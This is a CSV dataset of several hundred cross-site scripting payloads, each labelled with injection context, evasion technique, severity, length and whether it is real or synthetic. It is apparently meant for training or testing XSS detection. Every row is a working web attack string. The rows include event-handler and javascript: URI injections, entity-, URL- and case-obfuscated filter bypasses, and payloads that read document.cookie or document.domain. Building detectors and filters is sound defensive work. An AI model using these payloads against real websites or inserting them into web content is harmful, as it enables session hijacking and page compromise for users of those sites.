payload,context,technique,severity,length,source
"<progress onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",event_handler,none,medium,72,real
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",event_handler,none,medium,103,real
"""><svg onerror=prompt(document.cookie)>",tag_injection,synthetic,medium,39,synthetic
<nextid onpointermove=alert(1) style=display:block>AnonKryptiQuz</nextid>,event_handler,none,medium,73,real
"<colgroup onmouseout=""alert(1)"">AnonKryptiQuz</colgroup>",event_handler,none,medium,56,real
"<col onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></col>",event_handler,none,medium,279,real
"<INPUT+TYPE=""IMAGE""+SRC=""javascript:alert(1);"">",js_uri,case_variation,medium,47,real
"<a href=""&#x0000006a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,48,real
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",event_handler,none,medium,106,real
' ontoggl&#101;=confirm(1) ',attribute_escape,synthetic,medium,28,synthetic
"<audio2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</audio2>",event_handler,none,medium,85,real
\><plaintext/onmouseover=prompt(1),event_handler,none,medium,34,real
%3Csvg onerror=console.log(1)/%3E,tag_injection,synthetic,medium,33,synthetic
"<rt onmouseup=""alert(1)"">AnonKryptiQuz</rt>",event_handler,none,medium,43,real
<svG oNclIck=prOmpT(lOcaTioN.hAsh)/>,tag_injection,synthetic,medium,36,synthetic
"<input3 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></input3>",event_handler,none,medium,88,real
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",event_handler,none,medium,90,real
<svg onlo&#97;d=&#97;l&#101;rt(1)/>,tag_injection,synthetic,medium,35,synthetic
"<wbr draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</wbr>",event_handler,none,medium,59,real
<sup onpointerenter=alert(1) style=display:block>AnonKryptiQuz</sup>,event_handler,none,medium,68,real
"<applet draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,90,real
"<aside onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</aside>",event_handler,none,medium,70,real
"<dir onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,82,real
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationstart=""alert(1)""></blink>",event_handler,none,medium,97,real
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(4444)>",tag_injection,case_variation,medium,50,real
"<table onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,71,real
"<style>@keyframes slidein {}</style><object style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></object>",event_handler,none,medium,166,real
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></kbd>",event_handler,none,medium,110,real
"""><svg onclick=console.log(document.cookie)>",tag_injection,synthetic,medium,44,synthetic
<svg onerror=console.log(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
<input id=?a?value=?global?><input id=?b?value=?E?><input ?id=?c?value=?val?><input id=?d?value=?aler?><input id=?e?value=?t(documen?><input id=?f?value=?t.domain)?><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>,tag_injection,none,low,235,real
"<div draggable=""true"" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable style=display:block>drop here</datalist>",event_handler,none,medium,133,real
%22 onfocus=alert(%27XSS%27) autofocus=%22,attribute_escape,synthetic,medium,42,synthetic
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",event_handler,none,medium,55,real
"<multicol onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,69,real
"<sup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",event_handler,none,medium,65,real
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",script_injection,comment_injection,medium,53,real
JavAscRipT:vOid(coNsoLe.Log(loCatIon.haSh)),js_uri,synthetic,medium,43,synthetic
"<a ondblclick=""alert(1)"">AnonKryptiQuz</a>",event_handler,none,medium,42,real
"""><script+src=""https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)""></script>",script_injection,none,medium,112,real
"<style>:target {color: red;}</style><animatetransform id=x style=""transition:color 10s"" ontransitioncancel=print()></animatetransform>",event_handler,none,low,134,real
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",event_handler,none,medium,158,real
"<a href=""\xC2\xA0javascript:javascript:alert(2762)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,78,real
"<hgroup oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",event_handler,none,medium,64,real
"""><svg onmouseover=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,57,synthetic
"</ foo=""><script>javascript:alert(6163)</script>"">",script_injection,none,medium,50,real
<content onpointerover=alert(1) style=display:block>AnonKryptiQuz</content>,event_handler,none,medium,75,real
"<rt onmouseenter=""alert(1)"">AnonKryptiQuz</rt>",event_handler,none,medium,46,real
"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></li>",event_handler,none,medium,164,real
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",event_handler,none,medium,132,real
"<blink onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",event_handler,none,medium,68,real
"<a href=""javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,37,real
<scRipT>/*/cOnsOle.loG(lOcaTioN.hAsh)</ScrIpt>,script_injection,synthetic,medium,46,synthetic
"<command draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</command>",event_handler,none,medium,70,real
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,event_handler,none,medium,63,real
<button popovertarget=x>Click me</button><picture onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</picture>,event_handler,none,medium,110,real
<img srcset=validimage.png onload=alert(1)>,event_handler,none,medium,43,real
' onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,68,synthetic
"""><img src=x onerror=alert('AnonKryptiQuz');>",event_handler,none,medium,45,real
<svG oNmoUseEntEr=ConSolE.lOg(DocUmeNt.CooKie)/>,tag_injection,synthetic,medium,48,synthetic
"<header onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</header>",event_handler,none,medium,65,real
"<svG oNtoGglE=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,51,synthetic
"<svg onmous&#101;ov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,85,synthetic
"<Svg/OnLoad=alert(1337)>""@gmail.com",event_handler,case_variation,medium,35,real
' onclick=console.log(document.cookie) ',attribute_escape,synthetic,medium,40,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></head>",event_handler,none,medium,178,real
(A(%22onerror=%22alert%601%60%22)),event_handler,url_encoding,low,34,real
<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>,event_handler,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",event_handler,none,medium,113,real
"<marquee id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></marquee>",event_handler,none,medium,90,real
"<footer onmouseenter=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,54,real
"<blink draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</blink>",event_handler,none,medium,68,real
"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,44,real
<footer onpointerover=alert(1) style=display:block>AnonKryptiQuz</footer>,event_handler,none,medium,73,real
"<noscript draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",event_handler,none,medium,94,real
%3Cscript%3Econfirm('XSS')%3C/script%3E,script_injection,synthetic,medium,39,synthetic
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",script_injection,none,medium,101,real
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=print()></hr>",event_handler,none,low,106,real
"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable style=display:block>drop here</meter>",event_handler,none,medium,131,real
"<embed onmousedown=""alert(1)"">AnonKryptiQuz</embed>",event_handler,none,medium,51,real
"<content onmouseenter=""alert(1)"">AnonKryptiQuz</content>",event_handler,none,medium,56,real
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" ontransitionstart=alert(1)></thead>",event_handler,none,medium,110,real
"<blink onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",event_handler,none,medium,63,real
<datalist onpointerenter=alert(1) style=display:block>AnonKryptiQuz</datalist>,event_handler,none,medium,78,real
<output onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</output>,event_handler,none,medium,78,real
<form id=x tabindex=1 onfocus=alert(1)></form>,event_handler,none,medium,46,real
' onmouseenter=\u0061lert(document.cookie) ',attribute_escape,synthetic,medium,44,synthetic
"<iframe onmouseover=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,53,real
"<a href=""\xE2\x80\x85javascript:javascript:alert(9704)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable style=display:block>drop here</listing>",event_handler,none,medium,135,real
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,event_handler,url_encoding,medium,46,real
"<nobr onmouseleave=""alert(1)"">AnonKryptiQuz</nobr>",event_handler,none,medium,50,real
""" oNloAd=ConFirM(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,35,synthetic
"<brute+onbeforescriptexecute=a=alert,a(1%26%23x29>",event_handler,url_encoding,low,50,real
<set onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</set><input value=clickme>,event_handler,none,medium,97,real
"<IMG SRC=""javascript:alert('AnonKryptiQuz');"">",js_uri,case_variation,medium,46,real
"<sub onmouseleave=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,48,real
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationstart=""alert(1)""></sup>",event_handler,none,medium,93,real
<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,121,real
"<style>@keyframes slidein {}</style><hgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></hgroup>",event_handler,none,medium,172,real
<embed onpointerenter=alert(1) style=display:block>AnonKryptiQuz</embed>,event_handler,none,medium,72,real
<x contenteditable onkeyup=alert(1)>press any key!,event_handler,none,medium,50,real
document.write(%22<img src=x onerror=confirm(1)>%22),dom_sink,synthetic,medium,52,synthetic
"<embed draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",event_handler,none,medium,88,real
<svg><nav onload=alert(1)></nav>,event_handler,none,medium,32,real
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",event_handler,none,medium,168,real
""" ontoggl&#101;=&#97;l&#101;rt(1) """,attribute_escape,synthetic,medium,35,synthetic
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76',js_uri,none,low,90,real
%22 ontoggle=alert(1) %22,attribute_escape,synthetic,medium,25,synthetic
"<details onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</details>",event_handler,none,medium,72,real
"<keygen onclick=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",event_handler,none,medium,69,real
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",event_handler,none,medium,97,real
"<button oncontextmenu=""alert(1)"">AnonKryptiQuz</button>",event_handler,none,medium,55,real
"<code onmouseleave=""alert(1)"">AnonKryptiQuz</code>",event_handler,none,medium,50,real
"""><Svg onBegIn=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection,synthetic,medium,44,synthetic
<image srcset=1 onerror=alert(1)>,event_handler,none,medium,33,real
"<col onmousedown=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,47,real
<SCR%00IPT>alert(1)</SCR%00IPT>,generic,url_encoding|case_variation,medium,31,real
' onfocus=\u0061lert(location.hash) ',attribute_escape,synthetic,medium,37,synthetic
""" onlo&#97;d=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,44,synthetic
"""><svg ontoggl&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,78,synthetic
"""><Svg onTogGle=prOmpT(1)>",tag_injection,synthetic,medium,26,synthetic
<scr	ipt>alert`'XSS'`</scr	ipt>,script_injection,synthetic,medium,31,synthetic
"<hgroup onmousemove=""alert(1)"">AnonKryptiQuz</hgroup>",event_handler,none,medium,53,real
"<details draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</details>",event_handler,none,medium,90,real
<script>//alert(location.hash)</script>,script_injection,synthetic,medium,39,synthetic
"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></var>",event_handler,none,medium,160,real
"""'><img src=xxx:x \x0Donerror=javascript:alert(3902)>",event_handler,none,medium,53,real
"<address onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</address>",event_handler,none,medium,67,real
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable style=display:block>drop here</button>",event_handler,none,medium,133,real
<script>/x/console.log(%27XSS%27)</script>,script_injection,synthetic,medium,42,synthetic
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,event_handler,none,medium,44,real
"<template onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</template>",event_handler,none,medium,91,real
<content onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"j&#97;vascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,56,synthetic
"<svg onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,68,synthetic
"<aside draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</aside>",event_handler,none,medium,68,real
"<tr draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",event_handler,none,medium,81,real
<div style=xss:expressio&#x5c;6e(alert(1))>,generic,html_entity,medium,43,real
“><script>alert(1);</script>,script_injection,none,medium,28,real
<header onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</header><input value=clickme>,event_handler,none,medium,112,real
""" onbegin=console.log(1) """,attribute_escape,synthetic,medium,26,synthetic
%27 onmouseover=alert(document.domain) %27,attribute_escape,synthetic,medium,42,synthetic
<animatetransform onpointerover=alert(1) style=display:block>AnonKryptiQuz</animatetransform>,event_handler,none,medium,93,real
<i onpointerup=alert(1) style=display:block>AnonKryptiQuz</i>,event_handler,none,medium,61,real
"getURL,javascript:alert(1)"",",js_uri,none,medium,28,real
<strike id=x tabindex=1 onactivate=alert(1)></strike>,event_handler,none,medium,53,real
"<svg onload=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,49,synthetic
<script>/x/confirm('XSS')</script>,script_injection,synthetic,medium,34,synthetic
"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></td>",event_handler,none,medium,164,real
' ontoggle=confirm(1) ',attribute_escape,synthetic,medium,23,synthetic
' onclick=alert(1) ',attribute_escape,synthetic,medium,20,synthetic
"<meta onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,69,real
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",js_uri,none,medium,60,real
<svg onload=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,32,synthetic
"""><img src=x onerror=alert(String.fromCharCode(88,83,83));>",event_handler,encoding,medium,59,real
<scRipT>pRomPt`DocUmeNt.CooKie`</ScrIpt>,script_injection,synthetic,medium,40,synthetic
"' onfocus=console.log(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,54,synthetic
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,script_injection,comment_injection|case_variation,medium,67,real
"&lt;SCRIPT a=`&gt;` SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,89,real
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,64,real
%3cscript%3ealert()%3c/script>,generic,url_encoding,medium,30,real
"<table draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</table>",event_handler,none,medium,66,real
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;,event_handler,none,medium,104,real
"<menuitem draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,94,real
eval(%22console.log(location.hash)%22),dom_sink,synthetic,medium,38,synthetic
"<input3 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",event_handler,none,medium,85,real
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('AnonKryptiQuz'))\""&gt;",generic,html_entity,medium,87,real
"%22><svg onload=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",script_injection,encoding|case_variation,low,72,real
"<style>@keyframes slidein {}</style><track style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></track>",event_handler,none,medium,164,real
"javascr	ipt:alert(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,48,synthetic
"<sub draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,79,real
<scRipT>cOnfIrm('XSS')</ScrIpt>,script_injection,synthetic,medium,31,synthetic
<pre onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</pre><input value=clickme>,event_handler,none,medium,97,real
"<dir onmousedown=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,47,real
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",event_handler,none,medium,107,real
"<tt draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,62,real
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",event_handler,none,medium,115,real
"' oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,medium,55,synthetic
"<audio draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",event_handler,none,medium,88,real
"""><svg onerror=\u0061lert('XSS')>",tag_injection,synthetic,medium,33,synthetic
%3Cscript%3E//prompt('XSS')%3C/script%3E,script_injection,synthetic,medium,40,synthetic
<scr	ipt>/*/confirm(location.hash)</scr	ipt>,script_injection,synthetic,medium,44,synthetic
"<style>:target {transform: rotate(180deg);}</style><tr id=x style=""transition:transform 2s"" ontransitionrun=print()></tr>",event_handler,none,low,121,real
/><script>window.alert('AnonKryptiQuz Vulnerable');</script>,script_injection,none,medium,60,real
"<div draggable=""true"" contenteditable>drag me</div><set ondrop=alert(1) contenteditable style=display:block>drop here</set>",event_handler,none,medium,123,real
<tfoot onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</tfoot><input value=clickme>,event_handler,none,medium,110,real
"<style>@keyframes x{}</style><option style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></option>",event_handler,none,medium,105,real
""" onfocus=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) &#97;utofocus=""",attribute_escape,synthetic,medium,67,synthetic
"EvaL(""ProMpt(doCumEnt.doMaiN)"")",dom_sink,synthetic,medium,31,synthetic
<dd onpointerover=alert(1) style=display:block>AnonKryptiQuz</dd>,event_handler,none,medium,65,real
document.body.innerHTML=document.body.innerText,dom_sink,none,low,47,real
"<applet oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<br oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
%27 onerror=prompt(%27XSS%27) %27,attribute_escape,synthetic,medium,33,synthetic
"<html onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,63,real
"""%3E%3Csvg onload=alert(document.domain)%3E",tag_injection,synthetic,medium,43,synthetic
"<cite ondblclick=""alert(1)"">AnonKryptiQuz</cite>",event_handler,none,medium,48,real
"<head onmouseleave=""alert(1)"">AnonKryptiQuz</head>",event_handler,none,medium,50,real
"<area onclick=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,65,real
"<p draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,80,real
<template onpointerover=alert(1) style=display:block>AnonKryptiQuz</template>,event_handler,none,medium,77,real
<tbody onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</tbody><input value=clickme>,event_handler,none,medium,101,real
"<a onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a>",event_handler,none,medium,77,real
<data onpointerout=alert(1) style=display:block>AnonKryptiQuz</data>,event_handler,none,medium,68,real
"<animatetransform draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,108,real
"<image oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</image>",event_handler,none,medium,62,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",event_handler,none,medium,178,real
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,generic,url_encoding,low,85,real
"We can encode the ""javascript:"" in Hex/Octal",js_uri,none,low,44,real
"<set draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,79,real
<optgroup onpointermove=alert(1) style=display:block>AnonKryptiQuz</optgroup>,event_handler,none,medium,77,real
<svg onfocus=confirm(document.cookie)>,tag_injection,synthetic,medium,38,synthetic
"""><svg onfocus=confirm(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,49,synthetic
&#x00003C,generic,html_entity,low,9,real
<img src=x onerror=print()>,event_handler,none,low,27,real
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",event_handler,none,medium,108,real
"<element oncontextmenu=""alert(1)"">AnonKryptiQuz</element>",event_handler,none,medium,57,real
""" onerror=\u0061lert('XSS') """,attribute_escape,synthetic,medium,29,synthetic
"<data onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</data>",event_handler,none,medium,66,real
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" ontransitionstart=alert(1)></frameset>",event_handler,none,medium,116,real
"<spacer onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</spacer>",event_handler,none,medium,65,real
"' onfocus=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,53,synthetic
' oNfoCus=coNfiRm(1) ',attribute_escape,synthetic,medium,22,synthetic
"<style>:target {color:red;}</style><sub id=x style=""transition:color 1s"" ontransitionend=alert(1)></sub>",event_handler,none,medium,104,real
""";location=location.hash)//#0={};alert(0)",generic,none,medium,41,real
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationend=""alert(1)""></noembed>",event_handler,none,medium,99,real
"<strong onmouseup=""alert(1)"">AnonKryptiQuz</strong>",event_handler,none,medium,51,real
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,57,real
"<dl onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",event_handler,none,medium,62,real
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",event_handler,comment_injection|url_encoding|case_variation,medium,136,real
"<details onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</details>",event_handler,none,medium,75,real
"<q draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</q>",event_handler,none,medium,60,real
"<header draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</header>",event_handler,none,medium,88,real
%22><svg onmouseenter=console.log(location.hash)>,tag_injection,synthetic,medium,49,synthetic
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1709)'}{}*{-o-link-source:current}]{color:red};</style>,js_uri,none,medium,112,real
"""`'><script>\xE2\x80\x87javascript:alert(7616)</script>",script_injection,none,medium,55,real
<svg onload=console.log(document.domain)/>,tag_injection,synthetic,medium,42,synthetic
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",event_handler,none,medium,117,real
<svg><center onload=alert(1)></center>,event_handler,none,medium,38,real
%22><svg onmouseover=confirm(document.cookie)>,tag_injection,synthetic,medium,46,synthetic
<svG oNbeGin=coNsoLe.Log(1)>,tag_injection,synthetic,medium,28,synthetic
"""><svg onclick=\u0061lert(document.domain)>",tag_injection,synthetic,medium,43,synthetic
"<s oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</s>",event_handler,none,medium,54,real
"<animatemotion draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",event_handler,none,medium,104,real
"<xss onmouseup=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,56,real
<svG oNerRor=alErt(1)>,tag_injection,synthetic,medium,22,synthetic
"&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('AnonKryptiQuz');\""&gt;",generic,html_entity,medium,76,real
"<track onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</track>",event_handler,none,medium,69,real
<img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,58,synthetic
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationend=""alert(1)""></rt>",event_handler,none,medium,89,real
"<listing draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</listing>",event_handler,none,medium,72,real
